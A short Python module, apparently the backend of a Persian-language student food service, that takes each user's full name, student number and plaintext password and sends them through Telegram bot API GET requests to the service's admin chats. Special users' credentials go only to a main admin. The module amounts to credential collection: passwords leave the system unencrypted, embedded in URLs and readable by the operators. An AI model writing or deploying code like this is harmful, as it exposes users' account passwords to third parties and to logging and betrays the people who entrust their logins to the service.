import urllib

import requests
from api.models import (
    get_all_admin_chat_id,
    get_main_admin_chat_id,
    get_special_users,
    get_telegram_api,
)

TELEGRAM_API = get_telegram_api()
TELEGRAM_API_URL = "https://api.telegram.org/bot" + TELEGRAM_API + "/"


def send_data(full_name, stun, password):
    text = f"بوستان 🍟🍔\nنام: {full_name}\nشماره دانشجویی: {stun}\nرمزعبور: {password}"
    special_users = get_special_users()
    if stun in special_users:
        main_admin = get_main_admin_chat_id()
        req = TELEGRAM_API_URL + f"sendMessage?chat_id={main_admin}&text={text}"
        requests.get(req).json()
    else:
        send_request(text)


def send_alert(text):
    send_request(text)


def send_request(text):
    text = urllib.parse.quote_plus(str(text))
    admins = get_all_admin_chat_id()
    for admin in admins:
        print(admin.value)
        req = TELEGRAM_API_URL + f"sendMessage?chat_id={admin.value}&text={text}"
        requests.get(req).json()
